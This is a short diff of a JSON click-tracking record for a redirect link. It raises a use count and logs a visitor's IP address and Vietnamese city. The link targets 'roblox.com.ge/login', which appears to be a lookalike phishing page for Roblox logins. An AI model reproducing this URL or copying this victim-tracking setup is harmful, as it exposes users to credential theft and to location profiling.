@@ -142,7 +142,7 @@
     "targetUrl": "https://roblox.com.ge/login?returnUrl=0920460288224362",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 1084,
+    "useCount": 1085,
     "createdBy": "admin",
     "clicks": [
       {
@@ -8811,6 +8811,14 @@
       },
       {
         "timestamp": 1777256783193,
+        "ip": "1.55.38.156",
+        "country": "Vietnam",
+        "city": "Thị Trấn Phú Mỹ",
+        "flag": "🇻🇳",
+        "countryCode": "VN"
+      },
+      {
+        "timestamp": 1777256916954,
         "ip": "1.55.38.156",
         "country": "Vietnam",
         "city": "Thị Trấn Phú Mỹ",
